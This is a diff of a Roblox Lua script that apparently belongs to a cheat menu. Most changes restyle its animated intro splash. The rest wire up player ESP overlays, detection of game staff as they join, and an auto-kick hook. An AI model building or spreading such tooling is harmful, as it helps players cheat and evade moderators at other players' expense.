     tween(topAccent, {Size = UDim2.new(1, -48, 0, 2)}, 0.8, Enum.EasingStyle.Quart)
 
+    end
+
+    do
     local logo = Instance.new("Frame", card)
-    logo.BackgroundColor3 = Color3.fromRGB(18, 130, 255)
+    logo.BackgroundColor3 = Color3.fromRGB(12, 170, 205)
     logo.BackgroundTransparency = 0.08
     logo.Position = UDim2.new(0, 28, 0.5, -41)
     logo.Size = UDim2.new(0, 82, 0, 82)
@@ -1932,14 +3732,15 @@ local function showPremiumIntro()
     local logoGradient = Instance.new("UIGradient", logo)
     logoGradient.Color = ColorSequence.new({
         ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 220, 255)),
-        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(70, 105, 255)),
-        ColorSequenceKeypoint.new(1, Color3.fromRGB(175, 70, 255))
+        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(40, 150, 235)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(65, 235, 140))
     })
     logoGradient.Rotation = 135
     local logoStroke = Instance.new("UIStroke", logo)
     logoStroke.Color = Color3.fromRGB(115, 235, 255)
     logoStroke.Thickness = 2
     logoStroke.Transparency = 0.18
+    addGlow(logo, Color3.fromRGB(70, 170, 255), 0.48)
 
     local logoText = Instance.new("TextLabel", logo)
     logoText.BackgroundTransparency = 1
@@ -1955,10 +3756,44 @@ local function showPremiumIntro()
     logoTextGradient.Color = ColorSequence.new({
         ColorSequenceKeypoint.new(0, Color3.fromRGB(120, 255, 255)),
         ColorSequenceKeypoint.new(0.45, Color3.fromRGB(255, 255, 255)),
-        ColorSequenceKeypoint.new(0.7, Color3.fromRGB(180, 135, 255)),
-        ColorSequenceKeypoint.new(1, Color3.fromRGB(90, 215, 255))
+        ColorSequenceKeypoint.new(0.7, Color3.fromRGB(215, 255, 230)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(70, 235, 145))
     })
     logoTextGradient.Offset = Vector2.new(-1, 0)
+
+    local logoGlint = Instance.new("Frame", logo)
+    logoGlint.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    logoGlint.BackgroundTransparency = 0.68
+    logoGlint.BorderSizePixel = 0
+    logoGlint.Position = UDim2.new(0, -22, 0, -18)
+    logoGlint.Size = UDim2.new(0, 12, 0, 120)
+    logoGlint.Rotation = 28
+    logoGlint.ZIndex = 14
+    local logoGlintGradient = Instance.new("UIGradient", logoGlint)
+    logoGlintGradient.Transparency = NumberSequence.new({
+        NumberSequenceKeypoint.new(0, 1),
+        NumberSequenceKeypoint.new(0.5, 0),
+        NumberSequenceKeypoint.new(1, 1)
+    })
+
+    task.spawn(function()
+        while logo.Parent do
+            logoGlint.Position = UDim2.new(0, -22, 0, -18)
+            tween(logoGlint, {Position = UDim2.new(1, 12, 0, -18)}, 1.15, Enum.EasingStyle.Linear)
+            task.wait(2.8)
+        end
+    end)
+
+    task.spawn(function()
+        while logo.Parent do
+            tween(logoStroke, {Thickness = 4, Transparency = 0.02}, 0.7, Enum.EasingStyle.Sine)
+            tween(logo, {BackgroundTransparency = 0}, 0.7, Enum.EasingStyle.Sine)
+            task.wait(0.7)
+            tween(logoStroke, {Thickness = 2, Transparency = 0.28}, 0.7, Enum.EasingStyle.Sine)
+            tween(logo, {BackgroundTransparency = 0.1}, 0.7, Enum.EasingStyle.Sine)
+            task.wait(0.7)
+        end
+    end)
     task.spawn(function()
         task.wait(0.35)
         if not logoTextGradient.Parent then return end
@@ -1973,6 +3808,236 @@ local function showPremiumIntro()
         end
     end)
 
+    end
+
+    do
+    local lifeTree = Instance.new("Frame", splash)
+    lifeTree.Name = "LifeTreeAwakening"
+    lifeTree.AnchorPoint = Vector2.new(0.5, 0.5)
+    lifeTree.BackgroundTransparency = 1
+    lifeTree.Position = UDim2.new(0.5, 0, 0.5, 10)
+    lifeTree.Size = UDim2.new(0, 1300, 0, 940)
+    lifeTree.ZIndex = 3
+
+    local function addTreeSegment(x1, y1, x2, y2, thickness, color, delaySeconds)
+        local dx = x2 - x1
+        local dy = y2 - y1
+        local length = math.sqrt(dx * dx + dy * dy)
+        local limb = Instance.new("Frame", lifeTree)
+        limb.AnchorPoint = Vector2.new(0, 0.5)
+        limb.BackgroundColor3 = color
+        limb.BackgroundTransparency = 0.12
+        limb.BorderSizePixel = 0
+        limb.Position = UDim2.new(0, x1, 0, y1)
+        limb.Rotation = math.deg(math.atan2(dy, dx))
+        limb.Size = UDim2.new(0, 0, 0, thickness)
+        limb.ZIndex = 3
+        Instance.new("UICorner", limb).CornerRadius = UDim.new(1, 0)
+        local limbGradient = Instance.new("UIGradient", limb)
+        limbGradient.Color = ColorSequence.new(
+            Color3.fromRGB(215, 255, 225),
+            color
+        )
+        task.delay(delaySeconds, function()
+            if limb.Parent then
+                tween(
+                    limb,
+                    {Size = UDim2.new(0, length, 0, thickness)},
+                    0.9,
+                    Enum.EasingStyle.Quart
+                )
+            end
+        end)
+        return limb
+    end
+
+    -- The growth is built from explicit endpoints: roots at the bottom,
+    -- one tall, gently bending trunk, then layered forks and many fine twigs.
+    local trunkColor = Color3.fromRGB(75, 225, 135)
+    local branchColor = Color3.fromRGB(90, 245, 155)
+    local rootColor = Color3.fromRGB(45, 195, 115)
+    addTreeSegment(610, 830, 595, 700, 42, rootColor, 0.15)
+    addTreeSegment(595, 700, 610, 580, 35, trunkColor, 0.42)
+    addTreeSegment(610, 580, 590, 455, 27, trunkColor, 0.7)
+    addTreeSegment(590, 455, 620, 340, 21, branchColor, 0.98)
+    addTreeSegment(620, 340, 600, 235, 17, branchColor, 1.26)
+    addTreeSegment(600, 235, 620, 130, 13, Color3.fromRGB(110, 250, 165), 1.52)
+    addTreeSegment(620, 130, 590, 35, 9, Color3.fromRGB(125, 255, 180), 1.76)
+
+    -- Roots spread from the bottom of the trunk.
+    addTreeSegment(610, 815, 465, 875, 11, rootColor, 0.62)
+    addTreeSegment(465, 875, 300, 900, 6, rootColor, 0.86)
+    addTreeSegment(605, 815, 760, 875, 11, rootColor, 0.68)
+    addTreeSegment(760, 875, 930, 900, 6, rootColor, 0.92)
+    addTreeSegment(600, 805, 540, 920, 7, Color3.fromRGB(65, 215, 125), 0.98)
+    addTreeSegment(600, 805, 670, 920, 7, Color3.fromRGB(65, 215, 125), 1.06)
+    addTreeSegment(575, 820, 430, 845, 5, Color3.fromRGB(55, 205, 120), 1.12)
+    addTreeSegment(645, 820, 805, 840, 5, Color3.fromRGB(55, 205, 120), 1.18)
+    -- Broad buttress roots fill the lower silhouette before splitting into
+    -- the finer roots, keeping the base grounded beneath the intro card.
+    addTreeSegment(605, 790, 500, 815, 15, rootColor, 0.82)
+    addTreeSegment(500, 815, 365, 805, 9, rootColor, 1.0)
+    addTreeSegment(365, 805, 205, 830, 5, rootColor, 1.18)
+    addTreeSegment(615, 790, 720, 815, 15, rootColor, 0.88)
+    addTreeSegment(720, 815, 855, 805, 9, rootColor, 1.06)
+    addTreeSegment(855, 805, 1015, 830, 5, rootColor, 1.24)
+    addTreeSegment(580, 800, 465, 865, 8, Color3.fromRGB(60, 210, 122), 1.08)
+    addTreeSegment(465, 865, 335, 900, 4, Color3.fromRGB(60, 210, 122), 1.3)
+    addTreeSegment(640, 800, 755, 865, 8, Color3.fromRGB(60, 210, 122), 1.14)
+    addTreeSegment(755, 865, 885, 900, 4, Color3.fromRGB(60, 210, 122), 1.36)
+    addTreeSegment(555, 815, 405, 850, 5, Color3.fromRGB(50, 200, 118), 1.24)
+    addTreeSegment(665, 815, 815, 850, 5, Color3.fromRGB(50, 200, 118), 1.3)
+
+    -- Main limbs stay high on the trunk, leaving the lower middle open like
+    -- the broad silhouette of a carved tree-of-life canopy.
+    addTreeSegment(592, 505, 470, 420, 12, branchColor, 1.22)
+    addTreeSegment(470, 420, 355, 330, 9, branchColor, 1.42)
+    addTreeSegment(355, 330, 220, 345, 6, Color3.fromRGB(120, 255, 175), 1.62)
+    addTreeSegment(600, 465, 730, 390, 12, branchColor, 1.3)
+    addTreeSegment(730, 390, 850, 310, 9, branchColor, 1.5)
+    addTreeSegment(850, 310, 1010, 340, 6, Color3.fromRGB(120, 255, 175), 1.7)
+
+    addTreeSegment(615, 370, 500, 260, 10, branchColor, 1.46)
+    addTreeSegment(500, 260, 400, 165, 8, branchColor, 1.64)
+    addTreeSegment(400, 165, 270, 190, 5, Color3.fromRGB(125, 255, 180), 1.84)
+    addTreeSegment(615, 320, 740, 230, 10, branchColor, 1.54)
+    addTreeSegment(740, 230, 850, 140, 8, branchColor, 1.72)
+    addTreeSegment(850, 140, 1020, 185, 5, Color3.fromRGB(125, 255, 180), 1.92)
+
+    addTreeSegment(605, 250, 530, 150, 8, branchColor, 1.66)
+    addTreeSegment(530, 150, 455, 75, 6, branchColor, 1.84)
+    addTreeSegment(455, 75, 350, 60, 4, Color3.fromRGB(135, 255, 185), 2.0)
+    addTreeSegment(610, 220, 690, 125, 8, branchColor, 1.74)
+    addTreeSegment(690, 125, 770, 60, 6, branchColor, 1.92)
+    addTreeSegment(770, 60, 890, 82, 4, Color3.fromRGB(135, 255, 185), 2.08)
+
+    -- Fine limbs are concentrated in the upper crown rather than the middle.
+    addTreeSegment(470, 420, 430, 320, 6, Color3.fromRGB(75, 225, 135), 1.7)
+    addTreeSegment(430, 320, 340, 285, 4, Color3.fromRGB(100, 245, 155), 1.88)
+    addTreeSegment(430, 320, 390, 255, 4, Color3.fromRGB(85, 235, 145), 1.94)
+    addTreeSegment(730, 390, 780, 300, 6, Color3.fromRGB(75, 225, 135), 1.76)
+    addTreeSegment(780, 300, 900, 255, 4, Color3.fromRGB(100, 245, 155), 1.94)
+    addTreeSegment(780, 300, 820, 235, 4, Color3.fromRGB(85, 235, 145), 2.0)
+    addTreeSegment(500, 260, 455, 190, 5, Color3.fromRGB(85, 235, 145), 1.86)
+    addTreeSegment(455, 190, 380, 125, 4, Color3.fromRGB(110, 250, 165), 2.04)
+    addTreeSegment(455, 190, 420, 120, 4, Color3.fromRGB(95, 240, 150), 2.1)
+    addTreeSegment(740, 230, 800, 170, 5, Color3.fromRGB(85, 235, 145), 1.98)
+    addTreeSegment(800, 170, 920, 115, 4, Color3.fromRGB(110, 250, 165), 2.16)
+    addTreeSegment(800, 170, 835, 105, 4, Color3.fromRGB(95, 240, 150), 2.22)
+    addTreeSegment(530, 150, 490, 105, 4, Color3.fromRGB(95, 240, 150), 2.1)
+    addTreeSegment(690, 125, 725, 80, 4, Color3.fromRGB(95, 240, 150), 2.16)
+    addTreeSegment(590, 105, 535, 55, 4, Color3.fromRGB(105, 245, 155), 2.2)
+    addTreeSegment(590, 105, 650, 55, 4, Color3.fromRGB(105, 245, 155), 2.24)
+
+    for index, point in ipairs({
+        Vector2.new(300, 315),
+        Vector2.new(355, 330),
+        Vector2.new(350, 155),
+        Vector2.new(400, 165),
+        Vector2.new(440, 205),
+        Vector2.new(350, 60),
+        Vector2.new(455, 75),
+        Vector2.new(490, 105),
+        Vector2.new(220, 345),
+        Vector2.new(300, 345),
+        Vector2.new(405, 350),
+        Vector2.new(900, 285),
+        Vector2.new(850, 310),
+        Vector2.new(780, 315),
+        Vector2.new(700, 330),
+        Vector2.new(1010, 340),
+        Vector2.new(900, 125),
+        Vector2.new(850, 140),
+        Vector2.new(785, 175),
+        Vector2.new(720, 165),
+        Vector2.new(1020, 185),
+        Vector2.new(770, 60),
+        Vector2.new(890, 82),
+        Vector2.new(725, 80),
+        Vector2.new(535, 55),
+        Vector2.new(650, 55),
+        Vector2.new(590, 35),
+        Vector2.new(535, 95),
+        Vector2.new(650, 95),
+        Vector2.new(490, 155),
+        Vector2.new(720, 145),
+        Vector2.new(380, 125),
+        Vector2.new(420, 120),
+        Vector2.new(835, 105),
+        Vector2.new(920, 115),
+        Vector2.new(340, 285),
+        Vector2.new(390, 255),
+        Vector2.new(900, 255),
+        Vector2.new(820, 235),
+        Vector2.new(600, 130),
+        Vector2.new(620, 235),
+        Vector2.new(600, 235),
+        Vector2.new(430, 320),
+        Vector2.new(780, 300),
+    }) do
+        local leaf = Instance.new("Frame", lifeTree)
+        leaf.AnchorPoint = Vector2.new(0.5, 0.5)
+        leaf.BackgroundColor3 = index % 3 == 0
+            and Color3.fromRGB(225, 255, 160)
+            or Color3.fromRGB(80, 245, 145)
+        leaf.BackgroundTransparency = 1
+        leaf.BorderSizePixel = 0
+        leaf.Position = UDim2.new(0, point.X, 0, point.Y)
+        leaf.Size = UDim2.new(0, 0, 0, 0)
+        leaf.ZIndex = 4
+        Instance.new("UICorner", leaf).CornerRadius = UDim.new(1, 0)
+        local leafStroke = Instance.new("UIStroke", leaf)
+        leafStroke.Color = Color3.fromRGB(210, 255, 225)
+        leafStroke.Transparency = 0.25
+        task.delay(1.95 + index * 0.07, function()
+            if leaf.Parent then
+                local leafWidth = index % 4 == 0 and 38 or 29
+                local leafHeight = index % 4 == 0 and 20 or 15
+                tween(
+                    leaf,
+                    {
+                        Size = UDim2.new(0, leafWidth, 0, leafHeight),
+                        Rotation = index % 2 == 0 and -28 or 24,
+                        BackgroundTransparency = 0.08,
+                    },
+                    0.62,
+                    Enum.EasingStyle.Back
+                )
+            end
+        end)
+    end
+
+    local lifeGlint = Instance.new("Frame", lifeTree)
+    lifeGlint.BackgroundColor3 = Color3.fromRGB(235, 255, 220)
+    lifeGlint.BackgroundTransparency = 0.72
+    lifeGlint.BorderSizePixel = 0
+    lifeGlint.Position = UDim2.new(0, -34, 0, -30)
+    lifeGlint.Size = UDim2.new(0, 11, 1, 60)
+    lifeGlint.Rotation = 8
+    lifeGlint.ZIndex = 5
+    local lifeGlintGradient = Instance.new("UIGradient", lifeGlint)
+    lifeGlintGradient.Transparency = NumberSequence.new({
+        NumberSequenceKeypoint.new(0, 1),
+        NumberSequenceKeypoint.new(0.5, 0),
+        NumberSequenceKeypoint.new(1, 1),
+    })
+    task.spawn(function()
+        task.wait(3.3)
+        while lifeGlint.Parent do
+            lifeGlint.Position = UDim2.new(0, -34, 0, -30)
+            tween(
+                lifeGlint,
+                {Position = UDim2.new(1, 20, 0, -30)},
+                1.7,
+                Enum.EasingStyle.Linear
+            )
+            task.wait(3.1)
+        end
+    end)
+
+    end
+
+    do
     local ringOne = Instance.new("Frame", card)
     ringOne.BackgroundTransparency = 1
     ringOne.Position = UDim2.new(0, 20, 0.5, -49)
@@ -2003,12 +4068,43 @@ local function showPremiumIntro()
         end
     end)
 
+    local orbit = Instance.new("Frame", card)
+    orbit.BackgroundTransparency = 1
+    orbit.Position = UDim2.new(0, 12, 0.5, -57)
+    orbit.Size = UDim2.new(0, 114, 0, 114)
+    orbit.ZIndex = 11
+    Instance.new("UICorner", orbit).CornerRadius = UDim.new(1, 0)
+    local orbitStroke = Instance.new("UIStroke", orbit)
+    orbitStroke.Color = Color3.fromRGB(75, 235, 150)
+    orbitStroke.Thickness = 1
+    orbitStroke.Transparency = 0.38
+
+    local orbitDot = Instance.new("Frame", orbit)
+    orbitDot.BackgroundColor3 = Color3.fromRGB(255, 235, 90)
+    orbitDot.BorderSizePixel = 0
+    orbitDot.Position = UDim2.new(0.5, -3, 0, -3)
+    orbitDot.Size = UDim2.new(0, 6, 0, 6)
+    orbitDot.ZIndex = 12
+    Instance.new("UICorner", orbitDot).CornerRadius = UDim.new(1, 0)
+    addGlow(orbitDot, Color3.fromRGB(255, 210, 80), 0.28)
+
+    task.spawn(function()
+        while orbit.Parent do
+            tween(orbit, {Rotation = orbit.Rotation + 360}, 3.2, Enum.EasingStyle.Linear)
+            task.wait(3.2)
+            if orbit.Parent then orbit.Rotation = 0 end
+        end
+    end)
+
+    end
+
+    do
     local eyebrow = Instance.new("TextLabel", card)
     eyebrow.BackgroundTransparency = 1
     eyebrow.Position = UDim2.new(0, 138, 0, 38)
     eyebrow.Size = UDim2.new(1, -164, 0, 16)
     eyebrow.Font = Enum.Font.GothamMedium
-    eyebrow.Text = "FREE BUILD  /  EXECUTION SEQUENCE"
+    eyebrow.Text = "01 // SECURE SYSTEM  /  INITIALIZING"
     eyebrow.TextColor3 = theme.TextSecondary
     eyebrow.TextSize = 10
     eyebrow.TextTransparency = 1
@@ -2021,7 +4117,7 @@ local function showPremiumIntro()
     title.Position = UDim2.new(0, 136, 0, 54)
     title.Size = UDim2.new(1, -160, 0, 38)
     title.Font = Enum.Font.GothamBlack
-    title.Text = "VF STAFF ALERT"
+    title.Text = "PROJECT YGGDRASIL"
     title.TextColor3 = Color3.fromRGB(105, 225, 255)
     title.TextSize = 31
     title.TextStrokeColor3 = Color3.fromRGB(20, 35, 110)
@@ -2034,15 +4130,18 @@ local function showPremiumIntro()
     titleGlint.Color = ColorSequence.new({
         ColorSequenceKeypoint.new(0, Color3.fromRGB(45, 155, 255)),
         ColorSequenceKeypoint.new(0.32, Color3.fromRGB(0, 240, 255)),
-        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(220, 145, 255)),
-        ColorSequenceKeypoint.new(0.68, Color3.fromRGB(85, 120, 255)),
-        ColorSequenceKeypoint.new(1, Color3.fromRGB(35, 180, 255))
+        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(225, 255, 235)),
+        ColorSequenceKeypoint.new(0.68, Color3.fromRGB(80, 235, 155)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(35, 195, 225))
     })
     titleGlint.Offset = Vector2.new(-1, 0)
     task.spawn(function()
         task.wait(0.8)
-        if not titleGlint.Parent then return end
-        tween(titleGlint, {Offset = Vector2.new(1, 0)}, 2.6, Enum.EasingStyle.Linear)
+        while titleGlint.Parent do
+            titleGlint.Offset = Vector2.new(-1, 0)
+            tween(titleGlint, {Offset = Vector2.new(1, 0)}, 2.6, Enum.EasingStyle.Linear)
+            task.wait(2.2)
+        end
     end)
 
     local edition = Instance.new("TextLabel", card)
@@ -2050,29 +4149,15 @@ local function showPremiumIntro()
     edition.Position = UDim2.new(0, 138, 0, 96)
     edition.Size = UDim2.new(1, -164, 0, 24)
     edition.Font = Enum.Font.GothamBold
-    edition.Text = "FREE EDITION"
+    edition.Text = "◆ FREE ACCESS"
     edition.TextColor3 = Color3.fromRGB(255, 255, 255)
     edition.TextSize = 16
-    edition.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+    edition.TextStrokeColor3 = Color3.fromRGB(120, 75, 0)
     edition.TextStrokeTransparency = 0.2
     edition.TextTransparency = 1
     edition.TextXAlignment = Enum.TextXAlignment.Left
     edition.ZIndex = 12
     tween(edition, {TextTransparency = 0}, 0.8, Enum.EasingStyle.Quad)
-    local editionGlint = Instance.new("UIGradient", edition)
-    editionGlint.Color = ColorSequence.new({
-        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
-        ColorSequenceKeypoint.new(0.32, Color3.fromRGB(255, 225, 255)),
-        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)),
-        ColorSequenceKeypoint.new(0.68, Color3.fromRGB(255, 255, 255)),
-        ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255))
-    })
-    editionGlint.Offset = Vector2.new(-1, 0)
-    task.spawn(function()
-        task.wait(1.15)
-        if not editionGlint.Parent then return end
-        tween(editionGlint, {Offset = Vector2.new(1, 0)}, 2.35, Enum.EasingStyle.Linear)
-    end)
 
     local maker = Instance.new("TextLabel", card)
     maker.BackgroundTransparency = 1
@@ -2092,7 +4177,7 @@ local function showPremiumIntro()
     creatorName.Position = UDim2.new(0, 138, 0, 138)
     creatorName.Size = UDim2.new(1, -164, 0, 26)
     creatorName.Font = Enum.Font.GothamBold
-    creatorName.Text = "we1qxpo7j8fgkh3ok0ji"
+    creatorName.Text = "01 // Project Yggdrasil Team"
     creatorName.TextColor3 = Color3.fromRGB(155, 220, 255)
     creatorName.TextSize = 17
     creatorName.TextStrokeColor3 = Color3.fromRGB(25, 35, 105)
@@ -2112,8 +4197,11 @@ local function showPremiumIntro()
     creatorGlint.Offset = Vector2.new(-1, 0)
     task.spawn(function()
         task.wait(1.2)
-        if not creatorGlint.Parent then return end
-        tween(creatorGlint, {Offset = Vector2.new(1, 0)}, 2.55, Enum.EasingStyle.Linear)
+        while creatorGlint.Parent do
+            creatorGlint.Offset = Vector2.new(-1, 0)
+            tween(creatorGlint, {Offset = Vector2.new(1, 0)}, 2.55, Enum.EasingStyle.Linear)
+            task.wait(2.7)
+        end
     end)
 
     local progressTrack = Instance.new("Frame", card)
@@ -2131,7 +4219,7 @@ local function showPremiumIntro()
     progressFill.Size = UDim2.new(0, 0, 1, 0)
     progressFill.ZIndex = 13
     Instance.new("UICorner", progressFill).CornerRadius = UDim.new(1, 0)
-    tween(progressFill, {Size = UDim2.new(1, 0, 1, 0)}, 2.8, Enum.EasingStyle.Quart)
+    tween(progressFill, {Size = UDim2.new(1, 0, 1, 0)}, 6.5, Enum.EasingStyle.Quart)
 
     local status = Instance.new("TextLabel", card)
     status.BackgroundTransparency = 1
@@ -2146,8 +4234,16 @@ local function showPremiumIntro()
     status.TextXAlignment = Enum.TextXAlignment.Left
     status.ZIndex = 12
 
+    end
+
     task.spawn(function()
-        task.wait(3.5)
+        task.wait(7)
+        -- End the botanical layer with the intro content so the tree cannot
+        -- linger behind the fading card during splash cleanup.
+        local endingLifeTree = splash:FindFirstChild("LifeTreeAwakening")
+        if endingLifeTree then
+            endingLifeTree.Visible = false
+        end
         tween(card, {BackgroundTransparency = 1, Size = UDim2.new(0, 560, 0, 248)}, 0.45, Enum.EasingStyle.Quad)
         tween(cardStroke, {Transparency = 1}, 0.45, Enum.EasingStyle.Quad)
         tween(backdrop, {BackgroundTransparency = 1}, 0.55, Enum.EasingStyle.Quad)
@@ -2157,24 +4253,79 @@ local function showPremiumIntro()
     end)
 end
 
+local menuMouse = localPlayer:GetMouse()
 main.Visible = false
+do
+    state.MenuCursor = state.MenuCursor or { Icon = nil }
+
+    function state.MenuCursor.KeepVisible()
+        if main.Visible then
+            -- Gun tools can replace the cursor icon or disable it after their
+            -- own render callbacks. Preserve custom crosshair icons while
+            -- keeping the cursor visible over the menu.
+            if menuMouse.Icon and menuMouse.Icon ~= ""
+                and menuMouse.Icon ~= state.MenuCursor.Icon then
+                state.MenuCursor.Icon = menuMouse.Icon
+            end
+            if state.MenuCursor.Icon and state.MenuCursor.Icon ~= "" then
+                menuMouse.Icon = state.MenuCursor.Icon
+            end
+            UserInputService.MouseIconEnabled = true
+        elseif state.MenuCursor.Icon ~= nil then
+            menuMouse.Icon = state.MenuCursor.Icon
+            state.MenuCursor.Icon = nil
+        end
+    end
+
+    main:GetPropertyChangedSignal("Visible"):Connect(state.MenuCursor.KeepVisible)
+    RunService:BindToRenderStep(
+        ids.gui .. "_MenuCursor",
+        Enum.RenderPriority.Last.Value,
+        state.MenuCursor.KeepVisible
+    )
+end
+
 UserInputService.InputBegan:Connect(function(input, gpe)
     if gpe then return end
     if input.KeyCode == theme.ToggleKey and not isPlayerTyping() then
         state.Visible = not state.Visible
         main.Visible = state.Visible
-    elseif input.KeyCode == Enum.KeyCode.F1 and not isPlayerTyping() then
+    elseif staffCheckKey and input.KeyCode == staffCheckKey and not isPlayerTyping() then
         showStaffNotification()
     end
 end)
 
 -- Init
-for _, p in ipairs(Players:GetPlayers()) do
-    if p ~= localPlayer then applyESP(p) end
+task.spawn(function()
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p ~= localPlayer then applyESP(p) end
+    end
+end)
+
+local function detectPlayerOnJoin(player)
+    local bestClassification
+    for attempt = 1, 4 do
+        if not player.Parent then break end
+        local latest = classifyStaffPlayer(player)
+        if not bestClassification
+            or classificationPriority(latest.category) >= classificationPriority(bestClassification.category) then
+            bestClassification = latest
+        end
+        -- Keep the best result available if the player leaves during the
+        -- settling window; PlayerRemoving can then use it reliably.
+        state.StaffClassificationCache[player.UserId] = bestClassification
+        if attempt < 4 then task.wait(0.4) end
+    end
+    if player.Parent then
+        applyESP(player, bestClassification)
+        -- Re-check Auto Kick after group membership has had time to settle.
+        autoKickPlayerIfNeeded(player)
+    end
 end
 
 Players.PlayerAdded:Connect(function(p)
-    applyESP(p)
+    autoKickPlayerIfNeeded(p)
+    task.spawn(detectPlayerOnJoin, p)
     -- Wait for group API to settle, then always refresh the staff list
     task.wait(1)
     pcall(refreshStaffList)
@@ -2187,7 +4338,13 @@ Players.PlayerRemoving:Connect(function(p)
 end)
 
 task.spawn(function()
-    task.wait(3)
-    showPremiumIntro()
-    notify("STAFF ALERT STARTED", "T to toggle menu | F1 to check active staff", 5, "success")
+    task.wait(1)
+    state.ShowFreeIntro()
+    notify(
+        "STAFF ALERT STARTED",
+        (theme.ToggleKey and theme.ToggleKey.Name or "NONE") .. " to toggle menu | "
+            .. (staffCheckKey and staffCheckKey.Name or "No staff-check key bound"),
+        5,
+        "success"
+    )
 end)
